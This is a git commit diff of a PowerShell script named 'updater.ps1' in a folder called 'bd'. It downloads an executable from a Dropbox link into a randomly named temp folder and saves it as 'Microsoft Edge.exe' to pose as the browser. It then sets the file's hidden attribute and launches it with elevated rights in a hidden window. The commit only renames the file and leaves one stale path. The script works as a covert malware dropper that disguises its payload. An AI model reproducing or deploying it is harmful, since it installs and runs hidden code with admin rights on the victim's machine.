6d44ff7eb2893c03f83f41aeabff4f79044090ae
blousekool <132397759+blousekool@users.noreply.github.com>
2023-09-29 14:44:03 +0200

    Update updater.ps1

--- bd/updater.ps1
+++ bd/updater.ps1
@@ -5,11 +5,11 @@ start-sleep 10
 cd $env:temp/sVBXKuz
 
 #download new file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/y1cen9nbe4ghgi4hm2nmi/wsappa-1.7.exe?rlkey=dgtqp22fbwpgl18jvuvj6i1lb&dl=0" -OutFile Microsoft Edge_new.exe
-Copy-Item -Path .\Microsoft Edge_new.exe -Destination .\Microsoft Edge.exe -Force
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/y1cen9nbe4ghgi4hm2nmi/wsappa-1.7.exe?rlkey=dgtqp22fbwpgl18jvuvj6i1lb&dl=0" -OutFile Microsoft_Edge_new.exe
+Copy-Item -Path .\Microsoft Edge_new.exe -Destination .\Microsoft_Edge.exe -Force
 
 #delete old file
-Remove-Item .\Microsoft Edge_new.exe
+Remove-Item .\Microsoft_Edge_new.exe
 Remove-Item .\wsappa.exe
 
 #sleep
@@ -17,12 +17,12 @@ start-sleep 2
 
 
 # Set "Hidden" attribute on the file
-$filePath = Join-Path $env:temp\sVBXKuz "Microsoft Edge.exe"
+$filePath = Join-Path $env:temp\sVBXKuz "Microsoft_Edge.exe"
 $attr = [System.IO.FileAttributes]::Hidden
 [System.IO.File]::SetAttributes($filePath, $attr)
 
 #start new file
-Start-Process -FilePath "$env:temp/sVBXKuz/Microsoft Edge.exe" -Verb RunAs -WindowStyle Hidden
+Start-Process -FilePath "$env:temp/sVBXKuz/Microsoft_Edge.exe" -Verb RunAs -WindowStyle Hidden
 
 
 
